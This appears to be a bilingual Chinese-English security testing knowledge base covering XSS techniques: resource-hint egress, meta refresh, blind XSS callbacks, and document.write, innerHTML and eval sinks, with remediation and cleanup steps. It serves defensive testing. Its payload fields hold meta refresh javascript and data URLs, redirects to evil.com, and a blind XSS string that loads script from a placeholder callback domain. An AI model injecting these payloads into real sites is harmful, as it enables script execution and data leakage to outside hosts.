prerequisites.zh: 可在目标页面注入 link 元素，目标浏览器支持待测 rel 类型，并已区分 prefetch、dns-prefetch、preload 与 modulepreload。
prerequisites.en: A link element can be injected into the target page, the browser supports the tested rel type, and prefetch, dns-prefetch, preload, and modulepreload are distinguished.

prerequisites.zh: 每条 link 使用不同的自有域名或路径令牌，DNS、HTTP、浏览器性能条目和 CSP report 可分别关联。
prerequisites.en: Each link uses a distinct owned domain or path token, with DNS, HTTP, browser performance entries, and CSP reports correlated separately.

analysis.zh: 阳性证据是目标应用浏览器因特定 rel 节点产生预期 DNS 或资源请求；这只证明 HTML 注入导致外连，脚本执行还需独立的执行证据。 假阳性边界：安全扫描器、预览机器人、开发者机器、缓存命中或页面原有资源产生的请求，以及单纯 DNS 查询，都不能证明脚本 XSS。
analysis.en: Positive evidence requires the target application browser to emit the expected DNS or resource request because of the specific rel node; this proves HTML-injection-driven egress only, while script execution needs separate evidence. False-positive boundary: Requests from scanners, preview bots, developer machines, cache hits, or existing page resources, and a DNS query alone, do not prove script XSS.

opsecTips.zh: 资源提示测试端点不得返回脚本或大文件；发现重复预取、带凭据请求、公共域访问或性能退化时立即停止。
opsecTips.en: Resource-hint endpoints must return no script or large file; stop on repeated prefetching, credentialed requests, public-domain access, or performance degradation.

opsecTips.zh: 移除 link 节点和监听端点，清理 DNS、HTTP、preload 与浏览器缓存，删除令牌日志并重启隔离浏览器配置。
opsecTips.en: Remove link nodes and listener endpoints, clear DNS, HTTP, preload, and browser caches, delete token logs, and restart the isolated browser profile.

name.zh: meta refresh 导航与活动 URL 注入
name.en: Meta Refresh Navigation and Active URL Injection

description.zh: 验证可注入 meta refresh 是否触发跨源导航，以及 javascript 或 data URL 在实际浏览器和 CSP 下是否执行；两类结果必须分别记录。
description.en: Tests cross-origin navigation from injected meta refresh and whether javascript or data URLs execute under the actual browser and CSP, recording the outcomes separately.

overview.zh: meta refresh 导航与活动 URL 注入用于核对 CSP 指令与具体浏览器能力之间的控制边界。审查目标为：浏览器对 http-equiv=refresh 的 URL 解析是否允许外部跳转或活动文档方案，以及现有 CSP 是否真正约束该路径。策略问题的成立前提为：攻击者可以在文档允许位置插入 meta 元素，应用未限制跳转目标，且安全设计错误地假设 script-src 会覆盖所有导航。判定证据为：分别保存最终导航 URL、页面 origin 变化和任何脚本执行标记，普通外部跳转不能被报告为 XSS；普通导航、预取或单次外连必须与脚本执行分开记录。
overview.en: Meta Refresh Navigation and Active URL Injection checks whether URL parsing for http-equiv=refresh permits external navigation or active-document schemes and whether the deployed CSP constrains that path. It applies when an attacker can insert a meta element in an effective document position, redirect targets are unrestricted, and security design incorrectly assumes script-src governs all navigation. A conclusion requires the final navigation URL, origin change, and any script marker are captured separately; an ordinary external redirect is not reported as XSS; reflected text, simple network acceptance, or a browser compatibility difference alone is not proof.

vulnerability.zh: 策略风险的前提为：攻击者可以在文档允许位置插入 meta 元素，应用未限制跳转目标，且安全设计错误地假设 script-src 会覆盖所有导航。评估需要从最终响应中的生效 CSP 出发，逐项判断“浏览器对 http-equiv=refresh 的 URL 解析是否允许外部跳转或活动文档方案，以及现有 CSP 是否真正约束该路径”。若没有“分别保存最终导航 URL、页面 origin 变化和任何脚本执行标记，普通外部跳转不能被报告为 XSS”，策略警告、资源请求或页面跳转都不能单独证明 CSP 被绕过。
vulnerability.en: The risk exists when an attacker can insert a meta element in an effective document position, redirect targets are unrestricted, and security design incorrectly assumes script-src governs all navigation, allowing whether URL parsing for http-equiv=refresh permits external navigation or active-document schemes and whether the deployed CSP constrains that path. Review the input source, final parsing context, browser or policy version, and the final navigation URL, origin change, and any script marker are captured separately; an ordinary external redirect is not reported as XSS; otherwise record only an unconfirmed control differential.

exploitation.zh: 以受控同源路径建立 refresh 基线，再测试跨源、data 与 javascript 变体；使用自动化浏览器记录最终 URL、控制台和 CSP 事件。先保存完整响应头并展开指令回退关系，再以自有无害端点替换示例地址，记录 CSP 违规事件、网络 Initiator、最终 origin 和执行标记，分别评价每一种浏览器能力。
exploitation.en: In an authorized isolated environment, establish a controlled same-origin refresh baseline, then test cross-origin, data, and javascript variants while recording final URL, console output, and CSP events in an automated browser. Replay the original command set with one-time harmless markers, change one encoding, element, event, or policy variable at a time, and retain request, final DOM, console, network, and server evidence to exclude cache, prefetch, and manual-interaction false positives.

mitigation.zh: 从用户可控内容中移除 meta http-equiv，服务端只允许业务目标跳转，并同时部署合适的导航策略、frame 限制和上下文 HTML 消毒。在同一浏览器与缓存状态下重放合法资源、业务导航和原异常样例，确认必要功能仍可用，并且相关指令稳定阻断越界脚本、框架、基地址或资源外连。
mitigation.en: Remediation should remove meta http-equiv from user-controlled content, allow only business redirect destinations on the server, and combine navigation policy, frame restrictions, and context-aware HTML sanitization. Retest the normal baseline and minimized abnormal case in the same browser, policy, and input location to confirm required rendering, navigation, or resource loading remains available while execution, conditional requests, or object override evidence disappears.

title.zh: 解析“meta refresh 导航与活动 URL 注入”的生效策略
title.en: Scope the Meta Refresh Navigation and Active URL Injection data flow

description.zh: 抓取最终响应头并展开指令回退，确认前提“攻击者可以在文档允许位置插入 meta 元素，应用未限制跳转目标，且安全设计错误地假设 script-src 会覆盖所有导航”真实存在，而不是配置文档中的预期。
description.en: Trace the real input to the final sink or policy decision, confirm that an attacker can insert a meta element in an effective document position, redirect targets are unrestricted, and security design incorrectly assumes script-src governs all navigation, and record browser, response-header, and relevant component versions.

title.zh: 建立“客户端导航与 CSP”策略基线
title.en: Establish the Client Navigation and CSP baseline

description.zh: 用合法同源资源记录允许行为，再结合 CSP 违规事件、网络请求和证据标准“分别保存最终导航 URL、页面 origin 变化和任何脚本执行标记，普通外部跳转不能被报告为 XSS”区分结果。
description.en: Use a unique inert marker to establish response, DOM, network, and log baselines, accepting only the final navigation URL, origin change, and any script marker are captured separately; an ordinary external redirect is not reported as XSS as valid evidence.

title.zh: 逐能力验证“meta refresh 导航与活动 URL 注入”
title.en: Run a single-variable Meta Refresh Navigation and Active URL Injection check

description.zh: 以受控同源路径建立 refresh 基线，再测试跨源、data 与 javascript 变体；使用自动化浏览器记录最终 URL、控制台和 CSP 事件；将示例域替换为自有无害端点，每次只测试一种元素、指令或 URL 方案。
description.en: establish a controlled same-origin refresh baseline, then test cross-origin, data, and javascript variants while recording final URL, console output, and CSP events in an automated browser; minimize the original set one entry at a time and replace every callback or external destination with an isolated test endpoint.

attackChain.payload:
<meta http-equiv="refresh" content=0;url=javascript:alert(1)>
<meta http-equiv="refresh" content=0;url=data:text/html,<script>alert(1)</script>>
<meta http-equiv="refresh" content=0;url=//evil.com/>
<meta http-equiv="refresh" content=0;url=https://evil.com/>
<meta http-equiv="refresh" content="0;url=javascript:alert(1)">
<meta http-equiv="refresh" content="0;url=data:text/html,<script>alert(1)</script>">
<meta http-equiv="refresh" content="0;url=//evil.com/">
<meta http-equiv="refresh" content="0;url=https://evil.com/">

title.zh: 收紧 CSP 并执行回归
title.en: Retest the Meta Refresh Navigation and Active URL Injection remediation boundary

description.zh: 从用户可控内容中移除 meta http-equiv，服务端只允许业务目标跳转，并同时部署合适的导航策略、frame 限制和上下文 HTML 消毒；随后重放业务资源与异常输入，确认指令边界清晰且合法内容仍可加载。
description.en: After applying the documented remediation, replay normal and abnormal baselines and confirm required behavior remains while the final navigation URL, origin change, and any script marker are captured separately; an ordinary external redirect is not reported as XSS no longer appears.

review.rationale: meta refresh 导航与活动 URL 注入保留为 Payload，用于审查“浏览器对 http-equiv=refresh 的 URL 解析是否允许外部跳转或活动文档方案，以及现有 CSP 是否真正约束该路径”。成立时必须满足证据要求“分别保存最终导航 URL、页面 origin 变化和任何脚本执行标记，普通外部跳转不能被报告为 XSS”，而不是仅依据字符串回显、WAF 放行或普通网络请求。

prerequisites.zh: meta http-equiv=refresh 能进入浏览器认可的文档位置，刷新指令未被 sanitizer 删除，且目标浏览器/CSP 对 URL scheme 的处理已记录。
prerequisites.en: A meta refresh can enter a browser-recognized document position, the directive survives sanitization, and browser plus CSP handling of URL schemes is recorded.

prerequisites.zh: 跨源导航只指向自有空页面，javascript/data 分支只设置固定 marker，并保存导航事件、CSP 控制台和目标文档来源。
prerequisites.en: Cross-origin navigation points only to an owned empty page, javascript and data branches set only a fixed marker, and navigation events, CSP console output, and destination origin are preserved.

analysis.zh: 阳性证据需分层：跨源分支是 refresh 实际导航到自有目标；活动 URL 分支则必须在目标浏览器中执行 marker，并记录执行文档来源。 假阳性边界：meta 节点存在但被忽略、URL 显示在 DOM、浏览器阻止 javascript/data、普通 HTTP 重定向或只发生外部导航都不能直接称为 XSS。
analysis.en: Positive evidence is tiered: the cross-origin branch requires an actual refresh navigation to the owned target, while active-URL branches must execute the marker in the target browser with the execution-document origin recorded. False-positive boundary: A meta node that is ignored, a URL visible in the DOM, browser blocking of javascript or data, an ordinary HTTP redirect, or external navigation alone cannot be called XSS.

opsecTips.zh: meta refresh 测试设置足够延迟并防止循环；出现真实表单状态丢失、顶层非测试导航、下载或跨源数据携带时停止。
opsecTips.en: Meta refresh testing uses sufficient delay and prevents loops; stop on loss of real form state, non-test top-level navigation, downloads, or cross-origin data carriage.

opsecTips.zh: 删除 meta 节点和目标页，清理 history、BFCache 与站点数据，恢复测试路由并确认重载后没有延迟导航。
opsecTips.en: Remove meta nodes and target pages, clear history, BFCache, and site data, restore test routing, and confirm no delayed navigation after reload.

name.zh: Blind XSS 带外执行探针

description.zh: 用于管理员后台、日志查看器或异步审核页面中的存储型 XSS 验证，以唯一回调标记确认不可见渲染链路中的脚本执行。
description.en: Validates stored XSS in administrative consoles, log viewers, or asynchronous review pages through uniquely tagged out-of-band callbacks.

overview.zh: Blind XSS 带外执行探针用于核对 HTML 解析器如何处理当前输出位置。具体审查目标为：前台提交的值是否在另一个用户、后台任务或管理视图中未经编码地渲染并加载受控脚本资源。测试成立的前提为：输入在写入时只做浅层校验，后续高权限界面将其作为 HTML 展示，并允许连接到测试回调域或加载外部脚本。证据要求为：回调必须携带不可猜测的单次标记、目标环境时间戳与授权测试记录，禁止收集真实 Cookie、页面内容或个人数据。响应中出现输入文本或标签并不等同于脚本已经执行。
overview.en: Blind XSS Out-of-Band Execution Probe checks whether a submitted value is later rendered without encoding for another user, background workflow, or administrative view and loads a controlled script resource. It applies when input receives only shallow validation at write time, a later privileged view renders it as HTML, and the page can connect to a controlled callback origin or load external script. A conclusion requires the callback carries an unguessable one-time marker, environment timestamp, and authorized test record without collecting real cookies, page content, or personal data; reflected text, simple network acceptance, or a browser compatibility difference alone is not proof.

vulnerability.zh: 该问题的输入与输出前提为：输入在写入时只做浅层校验，后续高权限界面将其作为 HTML 展示，并允许连接到测试回调域或加载外部脚本。审查时必须确认“前台提交的值是否在另一个用户、后台任务或管理视图中未经编码地渲染并加载受控脚本资源”，并把服务端响应、最终 DOM、事件条件和浏览器版本关联起来。若无法满足“回调必须携带不可猜测的单次标记、目标环境时间戳与授权测试记录，禁止收集真实 Cookie、页面内容或个人数据”这一证据要求，只能说明输入进入页面，不能确认 XSS。
vulnerability.en: The risk exists when input receives only shallow validation at write time, a later privileged view renders it as HTML, and the page can connect to a controlled callback origin or load external script, allowing whether a submitted value is later rendered without encoding for another user, background workflow, or administrative view and loads a controlled script resource. Review the input source, final parsing context, browser or policy version, and the callback carries an unguessable one-time marker, environment timestamp, and authorized test record without collecting real cookies, page content, or personal data; otherwise record only an unconfirmed control differential.

exploitation.zh: 为每个输入位置生成独立无害回调标记，提交后等待已知审核流程；将 DNS/HTTP 命中与后台访问日志关联，并排除安全扫描器预取。为每行样例分配独立的无害标记，每轮只改变一种标签、属性或编码形式；同时保存原始响应、最终 DOM、控制台和事件记录，以排除缓存、浏览器容错及人工交互造成的假阳性。
exploitation.en: In an authorized isolated environment, generate a separate harmless callback marker for each input location, wait for the known review flow, correlate DNS or HTTP hits with backend access logs, and exclude security-scanner prefetches. Replay the original command set with one-time harmless markers, change one encoding, element, event, or policy variable at a time, and retain request, final DOM, console, network, and server evidence to exclude cache, prefetch, and manual-interaction false positives.

mitigation.zh: 在每个展示点按 HTML 上下文编码，富文本使用严格消毒策略；管理界面部署 nonce CSP、限制外连，并清理历史存储值后执行回归。修复后在同一输出位置重放普通文本、边界字符和最小异常样例，确认合法内容继续显示，同时活动节点、危险属性和对应执行记录均不再出现。
mitigation.en: Remediation should encode at every display sink, sanitize rich text with a strict policy, deploy nonce-based CSP and outbound restrictions on administrative views, and clean historical values before regression testing. Retest the normal baseline and minimized abnormal case in the same browser, policy, and input location to confirm required rendering, navigation, or resource loading remains available while execution, conditional requests, or object override evidence disappears.

title.zh: 定位“Blind XSS 带外执行探针”的输出上下文
title.en: Scope the Blind XSS Out-of-Band Execution Probe data flow

description.zh: 沿真实业务入口追踪到最终 HTML 位置，核对前提“输入在写入时只做浅层校验，后续高权限界面将其作为 HTML 展示，并允许连接到测试回调域或加载外部脚本”，并记录模板、消毒器和浏览器版本。
description.en: Trace the real input to the final sink or policy decision, confirm that input receives only shallow validation at write time, a later privileged view renders it as HTML, and the page can connect to a controlled callback origin or load external script, and record browser, response-header, and relevant component versions.

title.zh: 建立“存储型与带外 XSS”解析基线
title.en: Establish the Stored and Out-of-Band XSS baseline

description.zh: 先提交普通文本与边界字符，保存响应和最终 DOM；有效执行必须满足证据要求“回调必须携带不可猜测的单次标记、目标环境时间戳与授权测试记录，禁止收集真实 Cookie、页面内容或个人数据”。
description.en: Use a unique inert marker to establish response, DOM, network, and log baselines, accepting only the callback carries an unguessable one-time marker, environment timestamp, and authorized test record without collecting real cookies, page content, or personal data as valid evidence.

title.zh: 逐条重放“Blind XSS 带外执行探针”样例
title.en: Run a single-variable Blind XSS Out-of-Band Execution Probe check

description.zh: 为每个输入位置生成独立无害回调标记，提交后等待已知审核流程；将 DNS/HTTP 命中与后台访问日志关联，并排除安全扫描器预取；每次只替换一行并缩减命中项，所有外部地址均改为隔离测试端点。
description.en: generate a separate harmless callback marker for each input location, wait for the known review flow, correlate DNS or HTTP hits with backend access logs, and exclude security-scanner prefetches; minimize the original set one entry at a time and replace every callback or external destination with an isolated test endpoint.

attackChain.payload: "> '> javascript:eval('var a=document.createElement(\'script\');a.src=\'//YourXSSHunterDomain\';document.body.appendChild(a)')

title.zh: 修复并回归“Blind XSS 带外执行探针”
title.en: Retest the Blind XSS Out-of-Band Execution Probe remediation boundary

description.zh: 在每个展示点按 HTML 上下文编码，富文本使用严格消毒策略；管理界面部署 nonce CSP、限制外连，并清理历史存储值后执行回归；随后重放正常内容和最小异常样例，确认业务显示正常且活动内容不再生成。
description.en: After applying the documented remediation, replay normal and abnormal baselines and confirm required behavior remains while the callback carries an unguessable one-time marker, environment timestamp, and authorized test record without collecting real cookies, page content, or personal data no longer appears.

review.rationale: Blind XSS 带外执行探针保留为 Payload，用于审查“前台提交的值是否在另一个用户、后台任务或管理视图中未经编码地渲染并加载受控脚本资源”。成立时必须满足证据要求“回调必须携带不可猜测的单次标记、目标环境时间戳与授权测试记录，禁止收集真实 Cookie、页面内容或个人数据”，而不是仅依据字符串回显、WAF 放行或普通网络请求。

prerequisites.zh: 输入会被持久化并在明确的管理员后台、日志查看器或异步审核页面中以 HTML 渲染，测试账户与渲染流程均获授权。
prerequisites.en: Input is stored and rendered as HTML in a known administrator console, log viewer, or asynchronous review page, with both test accounts and render flow authorized.

prerequisites.zh: 每条记录使用自有域和唯一不可复用令牌，回调只记录最小请求元数据，不收集 cookie、DOM、截图或用户内容。
prerequisites.en: Each record uses an owned domain and unique nonreusable token, and callbacks collect only minimal request metadata without cookies, DOM, screenshots, or user content.

analysis.zh: 阳性证据是唯一令牌从预期后台渲染器触发脚本级回调，并可用存储记录、查看路由、时间、浏览器会话和 marker 执行关联。 假阳性边界：邮件安全网关、链接预览、爬虫、漏洞扫描器或人工打开 script src URL 产生的 DNS/HTTP 请求，没有脚本执行关联时都是假阳性。
analysis.en: Positive evidence requires the unique token to generate a script-level callback from the expected backend renderer, correlated with the stored record, view route, time, browser session, and marker execution. False-positive boundary: DNS or HTTP from mail gateways, link previews, crawlers, scanners, or manual opening of the script URL is a false positive without script-execution correlation.

opsecTips.zh: Blind XSS 探针只发送最小 marker 回调；发现非测试管理员、第三方预览器、真实会话标识或超出约定系统的请求时立即停止并停用令牌。
opsecTips.en: Blind XSS probes send only a minimal marker callback; stop and disable the token immediately on a non-test administrator, third-party previewer, real session identifier, or request outside the agreed system.

opsecTips.zh: 删除所有存储探针和后台渲染副本，停用回调端点与 DNS，按保留策略删除令牌日志，并复查队列/搜索索引无残留。
opsecTips.en: Delete all stored probes and rendered copies, disable callback and DNS endpoints, remove token logs under the retention policy, and verify queues and search indexes contain no residue.

name.zh: document.write HTML Sink 注入

description.zh: 验证 document.write 或 document.writeln 将可控字符串重新交给 HTML 解析器时，是否生成带事件或脚本的活动 DOM。
description.en: Tests whether document.write or document.writeln reparses a controllable string as active DOM containing event handlers or scripts.

overview.zh: document.write HTML Sink 注入审查客户端源到 sink 的完整数据流。需要确认的核心行为为：用户数据进入 document.write 系列调用后是否触发文档流重解析并创建新的可执行元素。适用前提为：客户端代码把 URL、消息或接口返回拼接进 document.write，且没有 Trusted Types、HTML 消毒或严格类型边界。DOM XSS 的证据标准是：调用栈、传入字符串、写入后 DOM 和唯一执行标记可以关联到同一次 document.write 调用；服务器响应不包含载荷并不能排除客户端问题。
overview.en: Document.write HTML Sink Injection checks whether user data passed to document.write causes document-stream reparsing and creates a new executable element. It applies when client code concatenates URL, message, or API data into document.write without Trusted Types, HTML sanitization, or a strict type boundary. A conclusion requires the call stack, input string, resulting DOM, and unique execution marker correlate to one document.write invocation; reflected text, simple network acceptance, or a browser compatibility difference alone is not proof.

vulnerability.zh: 客户端边界失效的前提为：客户端代码把 URL、消息或接口返回拼接进 document.write，且没有 Trusted Types、HTML 消毒或严格类型边界。审计应围绕“用户数据进入 document.write 系列调用后是否触发文档流重解析并创建新的可执行元素”记录源值、解码次数、赋值 API 与执行上下文。只有取得“调用栈、传入字符串、写入后 DOM 和唯一执行标记可以关联到同一次 document.write 调用”，才能证明可控数据到达了可执行 sink。
vulnerability.en: The risk exists when client code concatenates URL, message, or API data into document.write without Trusted Types, HTML sanitization, or a strict type boundary, allowing whether user data passed to document.write causes document-stream reparsing and creates a new executable element. Review the input source, final parsing context, browser or policy version, and the call stack, input string, resulting DOM, and unique execution marker correlate to one document.write invocation; otherwise record only an unconfirmed control differential.

exploitation.zh: 在 DevTools 中断 document.write，先观察正常参数，再通过真实来源提交原集合；记录写入发生在解析期还是加载后及浏览器替换行为。在 DevTools 中分别对真实读取点和写入点设置断点，使用一次性标记跟踪源值、规范化结果与最终 DOM；每轮只改变一个来源或 sink，避免把导航限制或 CSP 阻断误认为数据流已经修复。
exploitation.en: In an authorized isolated environment, break on document.write, observe a normal argument, then submit the original set through the real source while recording parse-time versus post-load behavior and document replacement. Replay the original command set with one-time harmless markers, change one encoding, element, event, or policy variable at a time, and retain request, final DOM, console, network, and server evidence to exclude cache, prefetch, and manual-interaction false positives.

mitigation.zh: 删除 document.write 路径，使用 createElement、textContent 和固定属性构建节点；必须渲染 HTML 时采用受审查消毒器与 TrustedHTML。回归应覆盖原客户端来源、合法业务 URL 或文本以及最小危险值，确认安全 API 保留原功能，且危险 sink 不再收到攻击者可控字符串。
mitigation.en: Remediation should remove document.write, build nodes with createElement, textContent, and fixed attributes, and require a reviewed sanitizer plus TrustedHTML when HTML rendering is unavoidable. Retest the normal baseline and minimized abnormal case in the same browser, policy, and input location to confirm required rendering, navigation, or resource loading remains available while execution, conditional requests, or object override evidence disappears.

description.en: break on document.write, observe a normal argument, then submit the original set through the real source while recording parse-time versus post-load behavior and document replacement; minimize the original set one entry at a time and replace every callback or external destination with an isolated test endpoint.

title.zh: 替换危险 API 并复测
title.en: Retest the Document.write HTML Sink Injection remediation boundary

description.zh: 删除 document.write 路径，使用 createElement、textContent 和固定属性构建节点；必须渲染 HTML 时采用受审查消毒器与 TrustedHTML；使用相同来源回放正常与异常值，确认安全 API 保留功能且不再产生执行路径。
description.en: After applying the documented remediation, replay normal and abnormal baselines and confirm required behavior remains while the call stack, input string, resulting DOM, and unique execution marker correlate to one document.write invocation no longer appears.

review.rationale: document.write HTML Sink 注入保留为 Payload，用于审查“用户数据进入 document.write 系列调用后是否触发文档流重解析并创建新的可执行元素”。成立时必须满足证据要求“调用栈、传入字符串、写入后 DOM 和唯一执行标记可以关联到同一次 document.write 调用”，而不是仅依据字符串回显、WAF 放行或普通网络请求。

prerequisites.zh: 应用把可控字符串传给 document.write 或 document.writeln，调用时机和文档解析状态可以从真实调用栈确认。
prerequisites.en: The application passes a controllable string to document.write or document.writeln, with call timing and document parsing state confirmed from the real call stack.

prerequisites.zh: 已对 write/writeln 增加参数跟踪，注入内容仅创建调用一次性 marker 的节点，并保存调用前后的 DOM 快照。
prerequisites.en: Argument tracing is added to write and writeln, injected content creates only a node that calls a one-time marker, and DOM snapshots before and after the call are saved.

analysis.zh: 阳性证据是受控字符串在真实 document.write sink 中被重新交给 HTML parser，创建活动节点并执行 marker，且调用栈回溯到可控来源。 假阳性边界：write 调用存在但参数固定、输入被编码、调用发生在关闭文档后只替换页面、输出形成文本节点或 marker 来自嵌套测试脚本均不成立。
analysis.en: Positive evidence requires the controlled string to be reparsed by the HTML parser at the real document.write sink, create an active node, and execute the marker with the call stack traced to the controlled source. False-positive boundary: A write call with constant arguments, encoded input, a post-close document replacement, text-node output, or a marker emitted by the test harness rather than injected content does not qualify.

opsecTips.zh: document.write 测试限制单次调用，禁止递归写入；发生文档清空、无限解析、导航、外部资源加载或应用状态丢失时停止。
opsecTips.en: Document.write testing permits one call and forbids recursive writes; stop on document clearing, endless parsing, navigation, external resource loading, or loss of application state.

opsecTips.zh: 撤销 write/writeln instrumentation，删除测试脚本和生成节点，重建隔离文档并清理 BFCache/站点缓存后回归。
opsecTips.en: Remove write and writeln instrumentation, test scripts, and generated nodes, rebuild the isolated document, clear BFCache and site caches, and regress.

name.zh: innerHTML 数据流注入

description.zh: 验证 location 等客户端来源进入 innerHTML 时，浏览器是否创建带事件处理器的活动节点；script 标签不执行不代表 sink 安全。
description.en: Tests whether location-derived data reaching innerHTML creates active nodes with event handlers; inert script tags do not make the sink safe.

overview.zh: innerHTML 数据流注入审查客户端源到 sink 的完整数据流。需要确认的核心行为为：location.hash、search、href 或 URL 数据是否未经净化写入 innerHTML，并通过新建元素事件形成执行路径。适用前提为：应用将数据与标记拼接后赋给 innerHTML，误以为浏览器不执行插入的 script 就能阻止所有 XSS。DOM XSS 的证据标准是：源值、innerHTML 赋值点、新建事件属性和唯一执行标记构成可复现的完整客户端链路；服务器响应不包含载荷并不能排除客户端问题。
overview.en: InnerHTML Data-Flow Injection checks whether location.hash, search, href, or URL data is written to innerHTML without sanitization and becomes executable through events on newly created elements. It applies when the application concatenates data into innerHTML and incorrectly assumes that non-execution of inserted script elements prevents all XSS. A conclusion requires the source value, innerHTML assignment, newly created event attribute, and unique execution marker form a reproducible client-side chain; reflected text, simple network acceptance, or a browser compatibility difference alone is not proof.

vulnerability.zh: 客户端边界失效的前提为：应用将数据与标记拼接后赋给 innerHTML，误以为浏览器不执行插入的 script 就能阻止所有 XSS。审计应围绕“location.hash、search、href 或 URL 数据是否未经净化写入 innerHTML，并通过新建元素事件形成执行路径”记录源值、解码次数、赋值 API 与执行上下文。只有取得“源值、innerHTML 赋值点、新建事件属性和唯一执行标记构成可复现的完整客户端链路”，才能证明可控数据到达了可执行 sink。
vulnerability.en: The risk exists when the application concatenates data into innerHTML and incorrectly assumes that non-execution of inserted script elements prevents all XSS, allowing whether location.hash, search, href, or URL data is written to innerHTML without sanitization and becomes executable through events on newly created elements. Review the input source, final parsing context, browser or policy version, and the source value, innerHTML assignment, newly created event attribute, and unique execution marker form a reproducible client-side chain; otherwise record only an unconfirmed control differential.

exploitation.zh: 对每个 location 来源使用独立标记，断点观察赋值前的解码值和赋值后的 DOM；重点检查 img、svg 等事件节点而非仅测试 script。在 DevTools 中分别对真实读取点和写入点设置断点，使用一次性标记跟踪源值、规范化结果与最终 DOM；每轮只改变一个来源或 sink，避免把导航限制或 CSP 阻断误认为数据流已经修复。
exploitation.en: In an authorized isolated environment, use a separate marker for each location source, inspect decoded values before assignment and DOM after assignment, and test event-capable nodes such as img and svg rather than script alone. Replay the original command set with one-time harmless markers, change one encoding, element, event, or policy variable at a time, and retain request, final DOM, console, network, and server evidence to exclude cache, prefetch, and manual-interaction false positives.

mitigation.zh: 默认改用 textContent；需要结构化 UI 时通过 createElement 绑定固定属性，或在 Trusted Types 策略中调用维护中的 HTML 消毒器。回归应覆盖原客户端来源、合法业务 URL 或文本以及最小危险值，确认安全 API 保留原功能，且危险 sink 不再收到攻击者可控字符串。
mitigation.en: Remediation should prefer textContent, construct structured UI with createElement and fixed attributes, or invoke a maintained HTML sanitizer inside an enforced Trusted Types policy. Retest the normal baseline and minimized abnormal case in the same browser, policy, and input location to confirm required rendering, navigation, or resource loading remains available while execution, conditional requests, or object override evidence disappears.

description.en: use a separate marker for each location source, inspect decoded values before assignment and DOM after assignment, and test event-capable nodes such as img and svg rather than script alone; minimize the original set one entry at a time and replace every callback or external destination with an isolated test endpoint.

prerequisites.zh: 可控客户端或服务端值确实到达 innerHTML 赋值，目标元素、赋值时机和 sanitizer 前后内容可观察。
prerequisites.en: A controllable client or server value reaches an innerHTML assignment, with target element, assignment timing, and content before and after sanitization observable.

prerequisites.zh: 测试使用确定失败的本地图片和一次性 onerror marker，记录赋值字符串、结果 DOM、事件目标与调用栈。
prerequisites.en: Testing uses a deterministically failing local image and a one-time onerror marker, recording the assigned string, resulting DOM, event target, and call stack.

analysis.zh: 阳性证据是 innerHTML 将受控字符串解析成带事件处理器的活动节点，资源事件触发 marker，并能从赋值点追溯到可控来源。 假阳性边界：script 标签经 innerHTML 不执行、DOM 中仅出现惰性节点、textContent 被误认为 innerHTML、sanitizer 删除事件或图片错误来自页面原有资源均是假阳性。
analysis.en: Positive evidence requires innerHTML to parse the controlled string into an active event-bearing node whose resource event triggers the marker, traced from assignment back to the controlled source. False-positive boundary: A nonexecuting script inserted through innerHTML, an inert DOM node, confusion with textContent, sanitizer removal of events, or an image error from an existing page resource is a false positive.

opsecTips.zh: innerHTML 事件样例必须防止递归 onerror；出现节点爆炸、布局失控、外部加载、重复 marker 或敏感 DOM 读取时停止。
opsecTips.en: InnerHTML event samples must prevent recursive onerror; stop on node explosion, layout loss, external loading, repeated markers, or sensitive DOM reads.

opsecTips.zh: 移除注入节点和监听器，恢复目标元素原始 HTML，清除 hash/storage 测试值与 DOM 快照，并重载确认无递归事件。
opsecTips.en: Remove injected nodes and listeners, restore the target element's original HTML, clear hash and storage test values plus DOM snapshots, and reload to confirm no recursive event.

name.zh: eval 与 Function 动态代码注入
name.en: Eval and Function Dynamic Code Injection

description.zh: 覆盖 eval、Function、字符串定时器等动态求值 sink，验证可控 URL 或字符串是否被解释为 JavaScript 源代码。
description.en: Covers eval, Function, and string-based timer sinks to test whether controllable URLs or strings are interpreted as JavaScript source code.

overview.zh: eval 与 Function 动态代码注入审查客户端源到 sink 的完整数据流。需要确认的核心行为为：不可信字符串是否到达 eval、Function、setTimeout 或 setInterval 的代码参数并在页面 origin 中求值。适用前提为：客户端把配置、URL 或消息数据当作表达式拼接，且 CSP 仍允许 unsafe-eval 或代码路径没有受类型约束。DOM XSS 的证据标准是：动态求值函数的调用栈、传入源码和唯一执行标记可关联，并排除浏览器地址栏主动阻止 javascript URL 的情况；服务器响应不包含载荷并不能排除客户端问题。
overview.en: Eval and Function Dynamic Code Injection checks whether an untrusted string reaches the code argument of eval, Function, setTimeout, or setInterval and is evaluated in the page origin. It applies when client code concatenates configuration, URL, or message data as an expression while CSP allows unsafe-eval or the path lacks a typed boundary. A conclusion requires the dynamic-evaluation call stack, source argument, and unique execution marker correlate, excluding cases where the browser blocks a javascript URL at navigation; reflected text, simple network acceptance, or a browser compatibility difference alone is not proof.

vulnerability.zh: 客户端边界失效的前提为：客户端把配置、URL 或消息数据当作表达式拼接，且 CSP 仍允许 unsafe-eval 或代码路径没有受类型约束。审计应围绕“不可信字符串是否到达 eval、Function、setTimeout 或 setInterval 的代码参数并在页面 origin 中求值”记录源值、解码次数、赋值 API 与执行上下文。只有取得“动态求值函数的调用栈、传入源码和唯一执行标记可关联，并排除浏览器地址栏主动阻止 javascript URL 的情况”，才能证明可控数据到达了可执行 sink。
vulnerability.en: The risk exists when client code concatenates configuration, URL, or message data as an expression while CSP allows unsafe-eval or the path lacks a typed boundary, allowing whether an untrusted string reaches the code argument of eval, Function, setTimeout, or setInterval and is evaluated in the page origin. Review the input source, final parsing context, browser or policy version, and the dynamic-evaluation call stack, source argument, and unique execution marker correlate, excluding cases where the browser blocks a javascript URL at navigation; otherwise record only an unconfirmed control differential.

exploitation.zh: 对每种 sink 设置断点，从真实数据源跟踪参数；先提交算术表达式确认求值，再使用原集合的无害标记验证是否具备任意代码语义。在 DevTools 中分别对真实读取点和写入点设置断点，使用一次性标记跟踪源值、规范化结果与最终 DOM；每轮只改变一个来源或 sink，避免把导航限制或 CSP 阻断误认为数据流已经修复。
exploitation.en: In an authorized isolated environment, break on each sink and trace arguments from the real source, first confirming evaluation with arithmetic before using harmless markers from the original set to establish arbitrary-code semantics. Replay the original command set with one-time harmless markers, change one encoding, element, event, or policy variable at a time, and retain request, final DOM, console, network, and server evidence to exclude cache, prefetch, and manual-interaction false positives.

mitigation.zh: 移除字符串求值，改为固定函数映射、JSON.parse 和类型化消息；删除 unsafe-eval，并使用 Trusted Types 或静态分析阻止新 sink。回归应覆盖原客户端来源、合法业务 URL 或文本以及最小危险值，确认安全 API 保留原功能，且危险 sink 不再收到攻击者可控字符串。
